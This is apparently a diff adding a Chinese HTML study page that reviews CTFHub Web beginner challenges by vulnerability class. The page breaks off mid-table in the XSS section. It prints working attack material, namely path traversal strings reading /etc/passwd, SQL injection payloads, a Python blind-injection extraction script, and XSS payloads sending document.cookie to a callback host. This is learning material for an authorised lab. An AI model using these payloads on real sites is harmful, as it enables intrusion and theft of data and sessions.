@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CTFHub Web 新手阶段总结</title>
+  <style>
+    :root {
+      --blue: #2563eb;
+      --blue-soft: #eff6ff;
+      --ink: #172033;
+      --muted: #64748b;
+      --line: #e2e8f0;
+      --green-soft: #f0fdf4;
+      --orange-soft: #fff7ed;
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      padding: 34px 20px 64px;
+      color: var(--ink);
+      background: linear-gradient(145deg, #eef4ff 0%, #f8fbff 46%, #edf9f3 100%);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
+      line-height: 1.75;
+    }
+    .container {
+      width: min(1020px, 100%);
+      margin: 0 auto;
+      padding: clamp(24px, 5vw, 52px);
+      background: rgba(255, 255, 255, 0.96);
+      border: 1px solid rgba(129, 149, 184, 0.2);
+      border-radius: 24px;
+      box-shadow: 0 18px 50px rgba(43, 74, 125, 0.1);
+    }
+    .back-link { color: var(--blue); font-weight: 700; text-decoration: none; }
+    .back-link:hover { text-decoration: underline; }
+    header { margin: 26px 0 30px; }
+    .eyebrow {
+      margin: 0 0 8px;
+      color: var(--blue);
+      font-size: 0.78rem;
+      font-weight: 800;
+      letter-spacing: 0.14em;
+      text-transform: uppercase;
+    }
+    h1 {
+      margin: 0 0 14px;
+      padding-bottom: 16px;
+      border-bottom: 2px solid #eef2f6;
+      font-size: clamp(2rem, 5vw, 3rem);
+      letter-spacing: -0.03em;
+    }
+    h2 {
+      margin: 42px 0 14px;
+      padding-left: 11px;
+      border-left: 5px solid var(--blue);
+      font-size: 1.5rem;
+      line-height: 1.35;
+    }
+    h3 { margin: 28px 0 10px; font-size: 1.15rem; }
+    h4 { margin: 20px 0 8px; font-size: 1rem; }
+    p { margin: 0 0 14px; color: #334155; }
+    ul, ol { margin: 0 0 16px; padding-left: 24px; color: #334155; }
+    li { margin-bottom: 7px; }
+    .subtitle { color: var(--muted); font-size: 1.03rem; }
+    .meta { margin: 10px 0 0; color: #94a3b8; font-size: 0.9rem; }
+    .toc {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin: 22px 0 8px;
+      padding: 14px;
+      background: #f8fbff;
+      border: 1px solid var(--line);
+      border-radius: 14px;
+    }
+    .toc a {
+      padding: 5px 10px;
+      color: #1d4ed8;
+      background: #fff;
+      border: 1px solid #dbeafe;
+      border-radius: 999px;
+      font-size: 0.88rem;
+      font-weight: 650;
+      text-decoration: none;
+    }
+    .toc a:hover { background: var(--blue-soft); }
+    .callout, .note, .warning {
+      margin: 18px 0;
+      padding: 15px 18px;
+      border-radius: 12px;
+    }
+    .callout { background: var(--blue-soft); border-left: 5px solid var(--blue); }
+    .note { background: var(--green-soft); border-left: 5px solid #22c55e; }
+    .warning { background: var(--orange-soft); border-left: 5px solid #f97316; }
+    .callout p, .note p, .warning p { margin: 0; }
+    table {
+      width: 100%;
+      margin: 16px 0 22px;
+      border-collapse: collapse;
+      background: #fff;
+      font-size: 0.94rem;
+    }
+    th, td {
+      padding: 11px 12px;
+      border: 1px solid var(--line);
+      text-align: left;
+      vertical-align: top;
+    }
+    th { background: #f1f5f9; color: #0f172a; font-weight: 750; }
+    tr:nth-child(even) td { background: #f8fbff; }
+    code {
+      padding: 2px 6px;
+      color: #be123c;
+      background: #f1f5f9;
+      border-radius: 5px;
+      font-family: Consolas, "Courier New", monospace;
+      font-size: 0.91em;
+      word-break: break-word;
+    }
+    pre {
+      margin: 14px 0 20px;
+      padding: 16px 18px;
+      overflow-x: auto;
+      color: #e2e8f0;
+      background: #172033;
+      border-radius: 12px;
+      font-family: Consolas, "Courier New", monospace;
+      font-size: 0.89rem;
+      line-height: 1.65;
+    }
+    pre code { padding: 0; color: inherit; background: transparent; font-size: inherit; }
+    .tag {
+      display: inline-block;
+      margin: 0 6px 6px 0;
+      padding: 3px 9px;
+      color: #1d4ed8;
+      background: var(--blue-soft);
+      border-radius: 999px;
+      font-size: 0.78rem;
+      font-weight: 700;
+    }
+    .flow {
+      display: grid;
+      grid-template-columns: repeat(4, minmax(0, 1fr));
+      gap: 10px;
+      margin: 18px 0 24px;
+    }
+    .flow div {
+      padding: 13px 12px;
+      background: #f8fbff;
+      border: 1px solid #dbeafe;
+      border-radius: 12px;
+      color: #1e3a8a;
+      font-weight: 700;
+      text-align: center;
+    }
+    .small { color: var(--muted); font-size: 0.9rem; }
+    footer {
+      margin-top: 46px;
+      padding-top: 18px;
+      border-top: 1px solid var(--line);
+      color: #94a3b8;
+      font-size: 0.9rem;
+    }
+    @media (max-width: 760px) {
+      body { padding: 14px 10px 34px; }
+      .container { padding: 22px 17px; border-radius: 16px; }
+      .flow { grid-template-columns: 1fr 1fr; }
+      table { display: block; overflow-x: auto; white-space: nowrap; }
+      td, th { white-space: normal; min-width: 120px; }
+    }
+  </style>
+</head>
+<body>
+  <main class="container">
+    <a class="back-link" href="index.html">← 返回 CTFHub 首页</a>
+
+    <header>
+      <p class="eyebrow">CTFHub / Web / Beginner Review</p>
+      <h1>CTFHub Web 新手阶段总结</h1>
+      <p class="subtitle">把「看题名背 Payload」升级成「按输入点判断题型」：分类、共同点、识别信号、技巧与通用做题法。</p>
+      <p class="meta">覆盖仓库中 41 道 CTFHub Web 题 + 6 道流量分析辅助题 · 更新：2026-09-23</p>
+    </header>
+
+    <nav class="toc" aria-label="页内目录">
+      <a href="#map">分类地图</a>
+      <a href="#common">共同点</a>
+      <a href="#judge">如何判断</a>
+      <a href="#http">HTTP 协议</a>
+      <a href="#leak">信息泄露</a>
+      <a href="#password">密码口令</a>
+      <a href="#sqli">SQL 注入</a>
+      <a href="#xss">XSS</a>
+      <a href="#upload">文件上传</a>
+      <a href="#traffic">流量分析</a>
+      <a href="#workflow">通用流程</a>
+      <a href="#roadmap">下一阶段</a>
+    </nav>
+
+    <section id="map">
+      <h2>一、全局分类：现在做过什么</h2>
+      <p>先把仓库里的题目按“漏洞发生的位置”分类。这样分类比按题目名称更稳定：同一个大类下，不同小题的入口和回显方式可能不同，但判断思路是一致的。</p>
+      <table>
+        <thead>
+          <tr><th>大类</th><th>数量</th><th>已做题目</th><th>核心目标</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Web 前置技能 / HTTP 协议</td>
+            <td>5</td>
+            <td>请求方式、302 跳转、Cookie、基础认证、响应包源代码</td>
+            <td>看懂请求与响应，学会用请求头、状态码、Cookie 和源码找线索。</td>
+          </tr>
+          <tr>
+            <td>信息泄露</td>
+            <td>11</td>
+            <td>目录遍历；网站源码、bak、vim 缓存、.DS_Store；PHPINFO；Git 泄露、Git #2、Git Stash；SVN 泄露；HG 泄露</td>
+            <td>从目录、备份、版本控制、配置页和文件读取漏洞中找源码或 Flag。</td>
+          </tr>
+          <tr>
+            <td>密码口令</td>
+            <td>2</td>
+            <td>弱口令、默认口令</td>
+            <td>识别产品/后台，尝试常见弱口令或厂商默认凭据。</td>
+          </tr>
+          <tr>
+            <td>SQL 注入</td>
+            <td>10</td>
+            <td>整数型、字符型、报错注入、布尔盲注、时间盲注、MySQL 结构、Cookie 注入、UA 注入、Referer 注入、过滤空格</td>
+            <td>让用户输入进入 SQL，读取数据库中的 Flag。</td>
+          </tr>
+          <tr>
+            <td>XSS</td>
+            <td>6</td>
+            <td>反射型、存储型、DOM 反射型、DOM JumpTo、空格过滤、关键字过滤</td>
+            <td>让浏览器执行脚本，读取 Bot Cookie 或完成数据外带。</td>
+          </tr>
+          <tr>
+            <td>文件上传</td>
+            <td>7</td>
+            <td>无限制、JS 前端验证、.htaccess、MIME 验证、00 截断、双写绕过、文件头检测</td>
+            <td>绕过上传校验，让服务器把上传文件当作脚本执行。</td>
+          </tr>
+          <tr>
+            <td>Misc 流量分析（辅助）</td>
+            <td>6</td>
+            <td>MySQL、Redis、MongoDB、ICMP、Length、LengthBinary</td>
+            <td>从协议流量、数据包长度或载荷中还原隐藏信息。</td>
+          </tr>
+        </tbody>
+      </table>
+      <div class="note">
+        <p><strong>注意：</strong>流量分析题在平台分类里属于 Misc，不是 Web。但它们训练的是“看协议、跟流、提取数据”的能力，对做 Web 审计、日志分析和数据包类题目很有帮助，所以放在这里作为辅助阶段一起复习。</p>
+      </div>
+    </section>
+
+    <section id="common">
+      <h2>二、Web 题的共同点</h2>
+      <p>不管题名是 SQL 注入、XSS 还是文件上传，本质上都在回答同一条链路上的问题：</p>
+      <div class="flow">
+        <div>1. 可控输入在哪里</div>
+        <div>2. 服务端怎么处理</div>
+        <div>3. 结果如何回显</div>
+        <div>4. 如何绕过限制</div>
+      </div>
+      <ul>
+        <li><strong>一定有输入点：</strong>URL 参数、POST 表单、Cookie、User-Agent、Referer、上传文件名、文件内容、JSON 字段，甚至 HTTP 方法本身。</li>
+        <li><strong>一定观察差异：</strong>正常请求和恶意请求的响应长度、状态码、关键字、时间、跳转地址、文件路径往往不同。</li>
+        <li><strong>先判断再利用：</strong>先证明“这里能影响服务端”，再决定用 Union、盲注、XSS 外带还是上传绕过。</li>
+        <li><strong>过滤是绕过的起点：</strong>题目故意只做一个黑名单或前端校验时，要找的是过滤边界，而不是硬碰硬。</li>
+        <li><strong>Flag 位置随题型变化：</strong>可能在响应源码、数据库、版本库历史、服务器文件、Bot Cookie 或流量载荷里。</li>
+        <li><strong>可复现最重要：</strong>写清楚请求、Payload、判断依据和失败尝试，比只记一个最终答案更有价值。</li>
+      </ul>
+    </section>
+
+    <section id="judge">
+      <h2>三、如何快速判断是什么题型</h2>
+      <p>推荐固定使用“四步判定法”：先看入口，再打标记，再看回显，最后做真假对照。</p>
+      <ol>
+        <li><strong>看入口：</strong>页面有没有参数、表单、登录、上传、跳转、Cookie、JS 代码或可疑路径。</li>
+        <li><strong>打标记：</strong>提交一个不会造成伤害的唯一字符串，例如 <code>ctfhub_marker_7x</code>，观察它出现在哪里。</li>
+        <li><strong>看回显：</strong>输入被拼进 SQL、HTML、文件路径、HTTP 响应头还是被保存到后端？这决定大类。</li>
+        <li><strong>做对照：</strong>提交真/假条件、不同状态码、不同延时的请求，确认是否存在布尔、时间或路径侧信道。</li>
+      </ol>
+
+      <table>
+        <thead>
+          <tr><th>观察到的信号</th><th>优先判断</th><th>第一动作</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>题目提示请求方法、403/405、302 跳转、401 认证</td><td>HTTP 协议题</td><td>用 cURL/Burp 修改方法、跟随跳转、查看响应头。</td></tr>
+          <tr><td>页面源码、注释、备份名、<code>.git</code>、<code>.svn</code>、<code>.hg</code>、<code>phpinfo</code></td><td>信息泄露</td><td>查看源码、目录和版本控制元数据，恢复历史文件。</td></tr>
+          <tr><td>有登录框、错误提示固定、没有验证码或锁定</td><td>弱口令 / 默认口令</td><td>先试产品默认账号，再用小规模常见弱口令。</td></tr>
+          <tr><td>参数参与数据库查询，引号/算式会改变结果或报错</td><td>SQL 注入</td><td>先测真/假条件，再判断 Union、报错、布尔或时间盲注。</td></tr>
+          <tr><td>输入被原样放到 HTML 或 JS 中，页面会执行脚本</td><td>XSS</td><td>判断反射、存储还是 DOM，再处理过滤与 Bot 外带。</td></tr>
+          <tr><td>有文件上传接口，返回保存路径或可访问上传目录</td><td>文件上传</td><td>逐层测试扩展名、MIME、文件头、解析规则和路径控制。</td></tr>
+          <tr><td>参数能控制文件读取路径</td><td>目录遍历 / 文件包含</td><td>先用 <code>../../</code> 读系统文件，再判断是否包含执行。</td></tr>
+          <tr><td>数据包中出现数据库、Redis、ICMP 或可疑长度字段</td><td>流量分析</td><td>Follow Stream、导出对象、解析协议和载荷。</td></tr>
+        </tbody>
+      </table>
+
+      <p>也可以用下面这棵“判定树”快速定位：</p>
+      <pre><code>页面 / 请求
+├─ 只改 HTTP 方法、跳转、Cookie、认证头？
+│  └─ HTTP 协议
+├─ 能访问源码、备份、.git、.svn、.hg、phpinfo？
+│  └─ 信息泄露
+├─ 有登录表单，错误提示可区分？
+│  └─ 弱口令 / 默认口令
+├─ 输入进入 SQL，真/假、报错或延时有差异？
+│  └─ SQL 注入
+├─ 输入进入 HTML/JS，浏览器执行脚本？
+│  └─ XSS
+├─ 能上传文件，服务器保存并可访问？
+│  └─ 文件上传
+├─ 能控制文件路径或读取任意文件？
+│  └─ 目录遍历 / 文件包含
+└─ 流量里有协议、长度或载荷线索？
+   └─ 流量分析</code></pre>
+    </section>    <section id="http">
+      <h2>四、分类详解与做题方法</h2>
+      <p class="small">下面按仓库已经覆盖的大类展开。每一类都按“识别信号 → 共同点 → 做题步骤 → 常用技巧 → 易错点”整理，方便以后遇到新题时直接套用。</p>
+
+      <h3>1. Web 前置技能 / HTTP 协议（5 题）</h3>
+      <p><span class="tag">请求方式</span><span class="tag">302 跳转</span><span class="tag">Cookie</span><span class="tag">Basic Auth</span><span class="tag">响应源码</span></p>
+      <h4>识别信号</h4>
+      <ul>
+        <li>题目直接提示“请使用某种请求方法”“请携带 Cookie”“请完成认证”。</li>
+        <li>响应状态码是 <code>302</code>、<code>401</code>、<code>405</code>，或者页面跳转与预期不一致。</li>
+        <li>用浏览器看不到 Flag，但响应头、源码注释或重定向地址里有提示。</li>
+      </ul>
+      <h4>共同点</h4>
+      <p>这类题不是复杂漏洞，而是考“你是否会看 HTTP 请求与响应”。线索通常在请求方法、请求头、Cookie、认证头、状态码和源码中，而不是页面正文里。</p>
+      <h4>做题步骤</h4>
+      <ol>
+        <li>用浏览器开发者工具或 cURL 保存原始请求，记录方法、URL、Header、Cookie。</li>
+        <li>改一个变量做对照：GET 改 POST、关闭/开启跳转、删除/添加 Cookie、尝试 Basic Auth。</li>
+        <li>查看响应行、响应头、重定向 Location、Set-Cookie 和 HTML 注释。</li>
+        <li>如果页面提示“响应包源代码”，直接看源代码或使用 <code>view-source</code>，不要只看渲染后的文字。</li>
+      </ol>
+      <pre><code>curl -i http://target/                         # 看响应头和状态码
+curl -i -X POST http://target/                 # 切换请求方法
+curl -i -L http://target/                      # 跟随 302 跳转
+curl -i -b "name=value" http://target/         # 携带 Cookie
+curl -i -u admin:admin http://target/          # Basic Auth
+curl -i "http://target/?a=1&amp;b=2"                 # 多个参数要正确转义
+</code></pre>
+      <div class="note"><p><strong>技巧：</strong>Burp Suite 的 Repeater 最适合逐项修改请求；浏览器 Network 面板适合快速观察 302 和 Set-Cookie。</p></div>
+      <h4>易错点</h4>
+      <ul>
+        <li><code>302</code> 不等于失败，真正的线索常在 <code>Location</code> 或跟随跳转后的页面。</li>
+        <li>Cookie 可能要求特定 Path、Domain 或 Session 一致，不能只复制一半。</li>
+        <li>Basic Auth 的凭据格式是 <code>base64(username:password)</code>，不是普通表单登录。</li>
+      </ul>
+
+      <h3 id="leak">2. 信息泄露（11 题）</h3>
+      <p><span class="tag">源码泄露</span><span class="tag">备份文件</span><span class="tag">版本控制</span><span class="tag">PHPINFO</span><span class="tag">目录遍历</span></p>
+      <h4>识别信号</h4>
+      <ul>
+        <li>页面源码、注释、JS 文件里出现服务器路径、备份名、版本库路径或提示。</li>
+        <li>访问常见路径返回 <code>200</code>、目录列表或不同长度的响应：<code>/robots.txt</code>、<code>/phpinfo.php</code>、<code>/.git/HEAD</code>、<code>/.svn/entries</code>、<code>/.hg/</code>、<code>/.DS_Store</code>。</li>
+        <li>参数像文件名或路径，例如 <code>?file=</code>、<code>?path=</code>、<code>?page=</code>，可以尝试读取任意文件。</li>
+        <li>网站源码题通常要下载备份包，再从源码里定位数据库配置、Flag 文件或隐藏路由。</li>
+      </ul>
+      <h4>共同点</h4>
+      <p>服务端把不该公开的“文件、元数据或配置”暴露出来。题目不一定有复杂漏洞，关键是信息收集是否完整：目录、源码、备份、版本库、配置页都属于攻击面。</p>
+      <h4>常见泄露入口速查</h4>
+      <table>
+        <thead><tr><th>入口</th><th>可能发现</th><th>常用动作</th></tr></thead>
+        <tbody>
+          <tr><td><code>robots.txt</code>、<code>sitemap.xml</code></td><td>隐藏目录、后台路径、禁止抓取的文件</td><td>直接访问并记录路径，再逐层探测。</td></tr>
+          <tr><td><code>www.zip</code>、<code>web.zip</code>、<code>backup.zip</code>、<code>*.bak</code>、<code>*~</code></td><td>网站源码、配置、数据库信息</td><td>下载后搜索 <code>flag</code>、数据库配置、路由和注释。</td></tr>
+          <tr><td><code>.index.php.swp</code>、<code>.index.php.swo</code>、<code>index.php~</code></td><td>vim 缓存或编辑器备份</td><td>用 vim 恢复，或 strings/正则提取源码。</td></tr>
+          <tr><td><code>.DS_Store</code></td><td>目录中的文件名列表</td><td>使用 ds_store/dscanner 解析，再访问泄露的文件。</td></tr>
+          <tr><td><code>/.git/</code>、<code>/.svn/</code>、<code>/.hg/</code></td><td>源码历史、提交记录、stash、被删除文件</td><td>用 GitHack、git-dumper、dvcs-ripper 等工具恢复。</td></tr>
+          <tr><td><code>phpinfo.php</code></td><td>环境变量、绝对路径、扩展、配置项</td><td>搜索 <code>DOCUMENT_ROOT</code>、<code>disable_functions</code>、<code>open_basedir</code>、<code>$_SERVER</code> 相关输出。</td></tr>
+          <tr><td>任意文件读取参数</td><td>系统文件、源码、配置、Flag</td><td>尝试 <code>../../</code>、URL 编码、双写编码和绝对路径。</td></tr>
+        </tbody>
+      </table>
+      <h4>Git 泄露标准流程</h4>
+      <pre><code># 1. 确认版本库入口
+curl -i http://target/.git/HEAD
+
+# 2. 恢复仓库（选择一种工具）
+python git_dumper.py http://target/.git ./recovered
+# 或使用 GitHack、dvcs-ripper
+
+# 3. 查看所有分支、提交和差异
+git log --all --oneline --decorate
+git log --all --stat
+git diff &lt;commit1&gt; &lt;commit2&gt;
+
+# 4. 查看 stash 和悬空对象
+git stash list
+git stash show -p
+git fsck --lost-found
+</code></pre>
+      <div class="callout"><p><strong>Git 题的核心：</strong>Flag 不一定在当前分支，可能在旧提交、被删除文件、其他分支或 stash 里。恢复仓库后要执行 <code>git log --all</code>，不要只看 <code>git log</code>。</p></div>
+      <h4>目录遍历与文件读取</h4>
+      <pre><code>?file=../../../../etc/passwd
+?file=..%2f..%2f..%2f..%2fetc%2fpasswd
+?file=%252e%252e%252fetc%252fpasswd
+?file=/var/www/html/flag.php
+?file=....//....//etc/passwd
+</code></pre>
+      <p class="small">遇到过滤时，先判断过滤的是 <code>../</code>、点、斜杠还是扩展名，再选择编码、重复路径或绝对路径。不同 PHP 版本的 <code>%00</code> 截断行为不同，不能直接假设。</p>
+      <h4>易错点</h4>
+      <ul>
+        <li>只扫描根目录就停止。信息泄露题往往要连续访问：目录 → 文件 → 备份 → 源码 → 新路径。</li>
+        <li>下载到源码后不搜索，建议直接全局搜索 <code>flag</code>、<code>key</code>、<code>secret</code>、<code>password</code>、<code>DB_</code>。</li>
+        <li>Git 恢复后只看当前 <code>HEAD</code>，遗漏其他分支、旧提交和 stash。</li>
+      </ul>
+
+      <h3 id="password">3. 密码口令（2 题）</h3>
+      <p><span class="tag">弱口令</span><span class="tag">默认口令</span><span class="tag">登录框</span><span class="tag">产品指纹</span></p>
+      <h4>识别信号</h4>
+      <ul>
+        <li>出现典型登录页，包含用户名、密码、可能还有验证码。</li>
+        <li>错误提示固定，例如 <code>user or password is wrong</code>，且没有明显的失败锁定。</li>
+        <li>页面标题、Logo、表单字段暴露产品名称或设备型号。</li>
+      </ul>
+      <h4>共同点</h4>
+      <p>不是爆破越猛越好，而是先识别目标产品与用户名策略，再用最小的候选集验证。CTF 中的弱口令通常是 <code>admin/admin123</code> 这类常见组合；默认口令则来自厂商文档或设备初始账号。</p>
+      <h4>做题步骤</h4>
+      <ol>
+        <li>确认登录请求的字段名、方法、验证码机制和失败特征。</li>
+        <li>先测试常见用户名：<code>admin</code>、<code>administrator</code>、<code>guest</code>、<code>test</code>、<code>root</code>。</li>
+        <li>如果是产品题，先搜索产品默认账号，不要一上来就大字典。</li>
+        <li>用 Burp Intruder、cURL 或 PowerShell 小规模验证；每次都保持验证码/Session 一致。</li>
+        <li>成功后立刻检查 Cookie、跳转地址、管理页面源码和后台功能。</li>
+      </ol>
+      <pre><code>curl.exe -i -X POST ^
+  --data-urlencode "name=admin" ^
+  --data-urlencode "password=admin123" ^
+  "http://target/"
+</code></pre>
+      <div class="warning"><p><strong>原则：</strong>只在题目授权环境中测试。真实站点不要进行高频爆破；先检查验证码、CSRF、锁定和速率限制。Hydra 等工具适合授权实验，不适合当作第一反应。</p></div>
+      <h4>易错点</h4>
+      <ul>
+        <li>把“响应长度变化”直接当作成功，实际可能只是错误提示长度不同。</li>
+        <li>忽略验证码与 Session 绑定，导致请求永远失败。</li>
+        <li>不识别产品就盲目套字典，浪费时间且容易触发锁定。</li>
+      </ul>
+
+      <h3 id="sqli">4. SQL 注入（10 题）</h3>
+      <p><span class="tag">Union</span><span class="tag">报错</span><span class="tag">布尔盲注</span><span class="tag">时间盲注</span><span class="tag">Header 注入</span><span class="tag">过滤绕过</span></p>
+      <h4>识别信号</h4>
+      <ul>
+        <li>参数进入数据库查询：<code>?id=1</code>、<code>?name=...</code>，页面可能还回显完整 SQL。</li>
+        <li>输入单引号、双引号或算式后出现 SQL 报错、页面异常、结果数量变化。</li>
+        <li>真条件和假条件响应不同；或者页面内容完全一样，但特定 Payload 会固定延迟。</li>
+        <li>Cookie、User-Agent、Referer 等请求头被服务端写入 SQL。</li>
+      </ul>
+      <h4>子类型速查</h4>
+      <table>
+        <thead><tr><th>子类型</th><th>典型现象</th><th>主要方法</th></tr></thead>
+        <tbody>
+          <tr><td>整数型注入</td><td>参数无引号包裹，<code>and 1=1</code>/<code>and 1=2</code> 有差异</td><td><code>order by</code> 判断列数，再用 <code>union select</code> 回显。</td></tr>
+          <tr><td>字符型注入</td><td>参数被单引号包裹，输入引号报错或改变结果</td><td>闭合引号并注释，例如 <code>1' and '1'='1</code>。</td></tr>
+          <tr><td>报错注入</td><td>页面回显数据库错误信息</td><td>用 <code>updatexml</code>、<code>extractvalue</code> 等把数据放入错误信息。</td></tr>
+          <tr><td>布尔盲注</td><td>不显示数据，只显示成功/失败或不同页面</td><td>用真假条件当作 Oracle，按字符二分提取。</td></tr>
+          <tr><td>时间盲注</td><td>页面内容无差异，但条件成立时响应变慢</td><td>用 <code>if(condition, sleep(n), 0)</code> 和二分法。</td></tr>
+          <tr><td>MySQL 结构</td><td>题目重点在库、表、字段枚举</td><td>查询 <code>information_schema</code>，再读取目标字段。</td></tr>
+          <tr><td>Header 注入</td><td>Cookie/UA/Referer 被拼接到 SQL</td><td>把注入标记放进对应请求头，注意编码和引号上下文。</td></tr>
+          <tr><td>过滤绕过</td><td>空格、关键字或注释被删除/阻断</td><td>注释代替空格、大小写混写、双写、十六进制字符串。</td></tr>
+        </tbody>
+      </table>
+      <h4>标准做题流程</h4>
+      <ol>
+        <li><strong>找注入点：</strong>用 <code>1</code>、<code>1'</code>、<code>1"</code>、<code>1 and 1=1</code>、<code>1 and 1=2</code> 做对照。</li>
+        <li><strong>判断类型：</strong>整数还是字符；有回显、报错、布尔差异还是时间差异。</li>
+        <li><strong>确定列数：</strong>用 <code>order by N</code> 或 <code>union select 1,2,3...</code>。</li>
+        <li><strong>确定回显位：</strong>让 <code>database()</code>、<code>user()</code>、<code>version()</code> 出现在页面上。</li>
+        <li><strong>枚举结构：</strong>查 <code>information_schema.tables</code> 和 <code>information_schema.columns</code>。</li>
+        <li><strong>读取数据：</strong>定位 Flag 表、字段和记录，最后输出到回显位或通过盲注提取。</li>
+      </ol>
+      <h4>常用 Payload</h4>
+      <pre><code># 基础判断
+1 and 1=1
+1 and 1=2
+1' and '1'='1
+1' and '1'='2
+
+# 列数
+1 order by 2#
+1 order by 3#
+
+# Union 回显
+0 union select 1,2#
+0 union select database(),user()#
+0 union select version(),@@version_compile_os#
+
+# 枚举表
+0 union select group_concat(table_name),2
+from information_schema.tables
+where table_schema=database()#
+
+# 枚举字段（flag 的十六进制为 0x666c6167）
+0 union select group_concat(column_name),2
+from information_schema.columns
+where table_schema=database()
+and table_name=0x666c6167#
+
+# 读取数据
+0 union select flag,2 from flag#
+</code></pre>
+      <h4>报错、布尔与时间盲注</h4>
+      <pre><code># 报错注入（不同数据库/版本行为可能不同）
+and updatexml(1, concat(0x7e, database()), 1)
+and extractvalue(1, concat(0x7e, database()))
+
+# 布尔盲注：条件成立时返回成功页面
+1 and ascii(substring((select flag from flag limit 0,1),1,1))&gt;64
+
+# 时间盲注：条件成立时延迟约 2 秒
+1 and if(ascii(substring((select flag from flag limit 0,1),1,1))&gt;64, sleep(2), 0)
+</code></pre>
+      <p>盲注不要手工逐字符猜。把请求封装成 <code>oracle(condition)</code> 函数，再用二分查找：</p>
+      <pre><code>import requests
+
+BASE = "http://target/"
+EXPR = "(select flag from flag limit 0,1)"
+
+def oracle(condition):
+    payload = f"1 and ({condition})"
+    r = requests.get(BASE, params={"id": payload}, timeout=10)
+    return "query_success" in r.text
+
+def get_char(pos):
+    low, high = 32, 127
+    while low &lt; high:
+        mid = (low + high) // 2
+        if oracle(f"ascii(substring({EXPR},{pos},1))&gt;={mid}"):
+            low = mid + 1
+        else:
+            high = mid
+    return chr(low - 1)
+
+flag = ""
+for pos in range(1, 80):
+    ch = get_char(pos)
+    if ch == "\x00":
+        break
+    flag += ch
+    print(flag)
+</code></pre>
+      <h4>过滤绕过速查</h4>
+      <table>
+        <thead><tr><th>被过滤内容</th><th>可尝试替代</th><th>说明</th></tr></thead>
+        <tbody>
+          <tr><td>空格</td><td><code>/**/</code>、<code>%09</code>、<code>%0a</code>、<code>%0d</code>、括号</td><td>SQL 注释和空白字符都可用于分隔关键字。</td></tr>
+          <tr><td>注释符</td><td><code>#</code> 的 URL 编码 <code>%23</code>、<code>-- </code>、<code>/*...*/</code></td><td><code>--</code> 在 MySQL 中通常需要后面跟空格才稳定。</td></tr>
+          <tr><td>关键字</td><td>大小写混写、双写、等价函数、十六进制字符串</td><td>例如 <code>union</code>、<code>select</code>、<code>and</code> 可能被简单黑名单过滤。</td></tr>
+          <tr><td>引号</td><td>十六进制、<code>char()</code>、数字拼接</td><td>避免提交被过滤的引号，例如 <code>flag</code> 写成 <code>0x666c6167</code>。</td></tr>
+          <tr><td>逗号</td><td>调整查询结构、使用 <code>limit offset</code> 等替代写法</td><td>先确认数据库类型，再选择兼容语法。</td></tr>
+        </tbody>
+      </table>
+      <h4>易错点</h4>
+      <ul>
+        <li>忘记 URL 编码：浏览器里的 <code>#</code> 是片段标识，提交给服务器前必须编码成 <code>%23</code>。</li>
+        <li>没有先确定列数和回显位，直接套 <code>union select</code>。</li>
+        <li>盲注没有做多次采样，偶发网络延迟被误判为时间盲注。</li>
+        <li>只查当前数据库，忽略 <code>information_schema</code> 中的库、表、字段。</li>
+      </ul>
+    </section>    <section id="xss">
+      <h2>五、XSS：输入进入浏览器执行链</h2>
+      <p><span class="tag">反射型</span><span class="tag">存储型</span><span class="tag">DOM 型</span><span class="tag">过滤绕过</span><span class="tag">Bot 外带</span></p>
+      <h4>识别信号</h4>
+      <ul>
+        <li>提交的字符串会出现在 HTML 源码中，且没有被正确编码。</li>
+        <li>提交内容会持久保存，之后每次访问页面都会再次出现（存储型）。</li>
+        <li>页面 JavaScript 从 <code>location.hash</code>、<code>location.search</code> 或接口响应中取值，再写入 <code>innerHTML</code>、<code>document.write</code> 等位置（DOM 型）。</li>
+        <li>题目提供 “Send URL to Bot” 或类似入口，Flag 通常位于 Bot 可访问的 Cookie 中。</li>
+      </ul>
+      <h4>三种 XSS 的区别</h4>
+      <table>
+        <thead><tr><th>类型</th><th>数据经过哪里</th><th>判断方法</th><th>利用重点</th></tr></thead>
+        <tbody>
+          <tr><td>反射型</td><td>当前请求 → 当前响应</td><td>Payload 只在本次请求的响应中出现</td><td>让 Bot 访问带 Payload 的 URL。</td></tr>
+          <tr><td>存储型</td><td>服务端数据库/文件 → 后续页面</td><td>再次访问页面，Payload 仍然存在</td><td>先把 Payload 存进去，再把页面 URL 交给 Bot。</td></tr>
+          <tr><td>DOM 型</td><td>浏览器端 JS 读取 Source → Sink</td><td>查看 JS，服务器响应中可能没有 Payload</td><td>控制 hash、查询参数或 JS 变量，使 Sink 执行。</td></tr>
+        </tbody>
+      </table>
+      <h4>做题步骤</h4>
+      <ol>
+        <li>提交唯一标记 <code>ctfhub_xss_marker</code>，在响应源码、属性、JS 字符串、URL 中定位输出上下文。</li>
+        <li>用最简单的 <code>alert(1)</code> 证明脚本能执行，不要一开始就写复杂 Payload。</li>
+        <li>根据上下文选择标签、事件或 JS 闭合方式，再处理空格、关键字等过滤。</li>
+        <li>如果 Flag 在 Bot Cookie 中，使用回调服务器接收 <code>document.cookie</code>；弹窗本身通常无法把结果带回攻击者。</li>
+        <li>注意编码层级：Payload 中的特殊字符先编码，完整 URL 作为 Bot 参数时还要再编码。</li>
+      </ol>
+      <pre><code># HTML 文本上下文
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+
+# 属性上下文（示例，具体闭合符取决于页面）
+" onmouseover="alert(1)
+"&gt;&lt;svg onload=alert(1)&gt;
+
+# 数据外带
+&lt;script&gt;location='https://your-callback.example/?c='+encodeURIComponent(document.cookie)&lt;/script&gt;
+&lt;img src=x onerror="fetch('https://your-callback.example/?c='+encodeURIComponent(document.cookie))"&gt;
+</code></pre>
+      <div class="callout"><p><strong>XSS 题的关键不是弹窗，而是攻击链：</strong>输入点 → 页面执行 → Bot 访问 → 读取 Cookie → 外带到你的回调地址。尤其要注意 <code>HttpOnly</code> Cookie 不能被 JavaScript 读取，真正能被脚本读取的往往是另一个 Flag Cookie。</p></div>
+      <h4>常见过滤绕过</h4>
+      <table>
